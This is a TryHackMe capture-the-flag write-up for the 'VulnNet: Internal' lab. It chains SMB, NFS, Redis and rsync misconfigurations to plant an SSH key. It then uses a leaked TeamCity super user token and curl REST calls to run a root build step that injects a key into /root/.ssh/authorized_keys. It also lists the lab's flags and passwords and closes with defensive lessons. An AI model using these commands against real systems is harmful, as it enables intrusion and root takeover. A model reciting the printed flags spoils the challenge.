# VulnNet: Internal — Full Penetration Test Writeup

> **Author:** 0xb0rn3
> **Target:** 10.48.185.54
> **Platform:** TryHackMe — VulnNet: Internal
> **Difficulty:** Medium
> **Category:** Internal Services Exploitation

---

## Table of Contents

1. [Summary](#summary)
2. [Flags Captured](#flags-captured)
3. [Methodology](#methodology)
4. [Phase 1: Reconnaissance](#phase-1-reconnaissance)
5. [Phase 2: Service Enumeration](#phase-2-service-enumeration)
   - [SMB Enumeration](#smb-enumeration)
   - [NFS Enumeration](#nfs-enumeration)
   - [Rsync Enumeration](#rsync-enumeration)
   - [Redis Enumeration](#redis-enumeration)
6. [Phase 3: Initial Access — SSH via Rsync](#phase-3-initial-access--ssh-via-rsync)
7. [Phase 4: Privilege Escalation — TeamCity RCE](#phase-4-privilege-escalation--teamcity-rce)
8. [Phase 5: Root Access Confirmed](#phase-5-root-access-confirmed)
9. [Lessons Learned](#lessons-learned)
10. [Vulnerability Summary](#vulnerability-summary)

---

## Summary

VulnNet: Internal is a machine designed around internal service misconfigurations rather than web application vulnerabilities. The attack chain follows a logical pivot across multiple services — SMB, NFS, Rsync, Redis, and finally TeamCity CI/CD — each leaking credentials or access that leads to the next. The final privilege escalation exploits TeamCity's build execution as root to inject SSH keys into `/root/.ssh/authorized_keys`.

---

## Flags Captured

| Flag | Value |
|------|-------|
| **services.txt** | `THM{0a09d51e488f5fa105d8d866a497440a}` |
| **internal flag** | `THM{ff8e518addbbddb74531a724236a8221}` |
| **user.txt** | `THM{da7c20696831f253e0afaca8b83c07ab}` |
| **root.txt** | `THM{e8996faea46df09dba5676dd271c60bd}` |

---

## Methodology

```
Recon → SMB/NFS/Rsync/Redis Enum → Credential Chain → SSH → TeamCity Abuse → Root
```

The attack chain:
1. **NFS** leaks Redis config → **Redis password**
2. **Redis** stores base64-encoded rsync credentials → **Rsync password**
3. **Rsync** provides full home directory access → SSH key injection → **user shell**
4. **TeamCity** running as root with exposed super user token → build RCE → **root shell**

---

## Phase 1: Reconnaissance

### Port Scan

```bash
nmap -sV -sC -p- --min-rate 5000 -Pn 10.48.185.54
```

### Results

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 8.2p1 |
| 111/tcp | rpcbind | 2-4 |
| 139/tcp | NetBIOS-SSN | Samba smbd 4 |
| 445/tcp | Microsoft-DS | Samba smbd 4 |
| 873/tcp | rsync | protocol version 31 |
| 2049/tcp | NFS | 3-4 |
| 6379/tcp | Redis | key-value store |
| 42283/tcp | Java RMI | — |

This machine immediately advertises a large internal attack surface — a hallmark of mismanaged internal infrastructure.

---

## Phase 2: Service Enumeration

### SMB Enumeration

```bash
smbclient -L //10.48.185.54 -N
```

**Shares discovered:**
- `shares` — VulnNet Business Shares (accessible anonymously)
- `print$` — Printer Drivers
- `IPC$` — IPC

```bash
smbclient //10.48.185.54/shares -N -c "recurse ON; ls"
```

Files found:
- `temp/services.txt` → **Flag 1**
- `data/data.txt`
- `data/business-req.txt`

**services.txt flag:** `THM{0a09d51e488f5fa105d8d866a497440a}`

---

### NFS Enumeration

```bash
showmount -e 10.48.185.54
# Export list: /opt/conf *
```

The `/opt/conf` NFS export is world-accessible (no restrictions). Mounting it:

```bash
sudo mount -t nfs 10.48.185.54:/opt/conf /tmp/nfs_mount
ls /tmp/nfs_mount
# hp  init  opt  profile.d  redis  vim  wildmidi
```

The `redis/` directory contains a full Redis configuration file:

```bash
grep 'requirepass' /tmp/nfs_mount/redis/redis.conf
# requirepass "B65Hx562F@ggAZ@F"
```

**Redis password obtained:** `B65Hx562F@ggAZ@F`

---

### Redis Enumeration

```bash
redis-cli -h 10.48.185.54 -a 'B65Hx562F@ggAZ@F' keys '*'
# marketlist, int, tmp, internal flag, authlist
```

**Internal flag retrieved:**

```bash
redis-cli -h 10.48.185.54 -a 'B65Hx562F@ggAZ@F' get "internal flag"
# THM{ff8e518addbbddb74531a724236a8221}
```

**Internal Flag:** `THM{ff8e518addbbddb74531a724236a8221}`

The `authlist` key contains base64-encoded rsync credentials:

```bash
redis-cli -h 10.48.185.54 -a 'B65Hx562F@ggAZ@F' lrange authlist 0 -1
# QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM...

echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
# Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

**Rsync credentials:** `rsync-connect` / `Hcg3HP67@TW@Bc72v`

---

### Rsync Enumeration

```bash
export RSYNC_PASSWORD='Hcg3HP67@TW@Bc72v'
rsync --list-only rsync://rsync-connect@10.48.185.54/files/
# ssm-user  sys-internal  ubuntu
```

The rsync share exposes full home directories including `sys-internal`. The user's home contains:
- `user.txt` → **Flag 3**
- `.ssh/` directory (writable)

**User flag retrieved:**

```bash
rsync rsync://rsync-connect@10.48.185.54/files/sys-internal/user.txt /tmp/user.txt
# THM{da7c20696831f253e0afaca8b83c07ab}
```

**User Flag:** `THM{da7c20696831f253e0afaca8b83c07ab}`

---

## Phase 3: Initial Access — SSH via Rsync

Since the `.ssh/` directory is writable through rsync, we can inject our own SSH public key:

```bash
# Generate key pair
ssh-keygen -t rsa -b 4096 -f /tmp/vulnnet_key -N ""

# Copy public key to authorized_keys
cp /tmp/vulnnet_key.pub /tmp/authorized_keys

# Upload via rsync
export RSYNC_PASSWORD='Hcg3HP67@TW@Bc72v'
rsync /tmp/authorized_keys rsync://rsync-connect@10.48.185.54/files/sys-internal/.ssh/authorized_keys
```

SSH in as `sys-internal`:

```bash
ssh -i /tmp/vulnnet_key sys-internal@10.48.185.54
# uid=1000(sys-internal) gid=1000(sys-internal)
```

---

## Phase 4: Privilege Escalation — TeamCity RCE

### Discovery

Checking running processes revealed **TeamCity CI/CD server** running as **root**:

```bash
ps aux | grep -i team
# root  1221  ... /TeamCity/... org.apache.catalina.startup.Bootstrap start
```

TeamCity listens internally on port 8111. The super user token is printed in the server logs:

```bash
grep 'Super user authentication token' /TeamCity/logs/catalina.out | tail -1
# [TeamCity] Super user authentication token: 8977196237306343825
```

### Exploitation — REST API Build Injection

Set up SSH port forward to access TeamCity:

```bash
ssh -i /tmp/vulnnet_key -L 8111:127.0.0.1:8111 sys-internal@10.48.185.54 -N -f
```

Authenticate using the super user token (empty username, token as password):

```bash
curl -u ":8977196237306343825" http://127.0.0.1:8111/app/rest/server
```

Create a project and build configuration via REST API:

```bash
# Create project
curl -u ":8977196237306343825" -X POST http://127.0.0.1:8111/app/rest/projects \
  -H "Content-Type: application/json" \
  -d '{"name":"PwnProject","id":"PwnProject","parentProject":{"id":"_Root"}}'

# Create build type
curl -u ":8977196237306343825" -X POST http://127.0.0.1:8111/app/rest/buildTypes \
  -H "Content-Type: application/json" \
  -d '{"id":"PwnBuild","name":"PwnBuild","project":{"id":"PwnProject"}}'
```

Add a malicious build step (runs as root):

```bash
curl -u ":8977196237306343825" -X POST \
  http://127.0.0.1:8111/app/rest/buildTypes/id:PwnBuild/steps \
  -H "Content-Type: application/json" \
  -d '{
    "name": "PWN",
    "type": "simpleRunner",
    "properties": {
      "property": [
        {"name": "script.content", "value": "mkdir -p /root/.ssh && echo '"'"'<SSH_PUBKEY>'"'"' >> /root/.ssh/authorized_keys && cat /root/root.txt > /tmp/root_flag.txt"},
        {"name": "use.custom.script", "value": "true"},
        {"name": "teamcity.step.mode", "value": "default"}
      ]
    }
  }'
```

Trigger the build:

```bash
curl -u ":8977196237306343825" -X POST http://127.0.0.1:8111/app/rest/buildQueue \
  -H "Content-Type: application/json" \
  -d '{"buildType": {"id": "PwnBuild"}}'
```

Build executes as root. Root flag written to `/tmp/root_flag.txt`:

```bash
cat /tmp/root_flag.txt
# THM{e8996faea46df09dba5676dd271c60bd}
```

---

## Phase 5: Root Access Confirmed

With the SSH key injected into `/root/.ssh/authorized_keys` by the build step:

```bash
ssh -i /tmp/vulnnet_key root@10.48.185.54
# uid=0(root) gid=0(root) groups=0(root)
```

**Root Flag:** `THM{e8996faea46df09dba5676dd271c60bd}`

---

## Lessons Learned

### 1. NFS Exports Without Access Controls Are Dangerous
The `/opt/conf` NFS share was exported to `*` (world). Anyone on the network could mount and read sensitive configuration files. Proper NFS security requires IP-based restrictions, `root_squash`, and `nosuid` options.

### 2. Never Store Plaintext Credentials in Configuration Files Accessible Over the Network
The Redis configuration with `requirepass` was readable from the NFS mount. Configuration files should never be shared over unprotected network services.

### 3. Redis Should Not Be Publicly Accessible Without Network-Level Controls
Even though Redis had a password, it was listening on `0.0.0.0:6379`. Redis should be bound to `127.0.0.1` or protected by firewall rules.

### 4. Sensitive Data in Redis Keystore
The `authlist` key contained base64-encoded credentials for another service. Redis is not a secrets manager. Storing credentials in Redis creates a single point of failure.

### 5. Rsync Credentials Provide Dangerous Filesystem Access
The rsync share exposed the full home directory filesystem with write access. This allowed SSH key injection — a trivial path to shell access.

### 6. CI/CD Systems Running as Root Are Critical Attack Vectors
TeamCity's build agent and server were both running as root. Any authenticated user with build execution permissions could trivially run arbitrary OS commands as root. CI/CD systems should always run as a dedicated low-privilege user.

### 7. TeamCity Super User Token Exposed in Log Files
The super user authentication token is logged in plaintext in `catalina.out`. Log files should have strict permission controls, and super user access should require proper credential management.

### 8. Service Chaining / Credential Pivoting
Each service leaked credentials for the next. This is a common pattern in real-world breaches — defense-in-depth is critical. Compromising any single service should not cascade into full system compromise.

---

## Vulnerability Summary

| Vulnerability | Service | Impact |
|--------------|---------|--------|
| Unauthenticated NFS export | NFS (2049) | Redis password disclosure |
| Plaintext credentials in config | Redis/NFS | Service credential exposure |
| Redis keystore holds sensitive data | Redis (6379) | Rsync credential disclosure |
| Writable rsync home directories | Rsync (873) | SSH key injection → user shell |
| TeamCity super user token in logs | TeamCity (8111) | Authenticated build RCE |
| CI/CD running as root | TeamCity | Local privilege escalation to root |

---

*Full automation POC available in `vulnnet_internal_pwn.sh`*
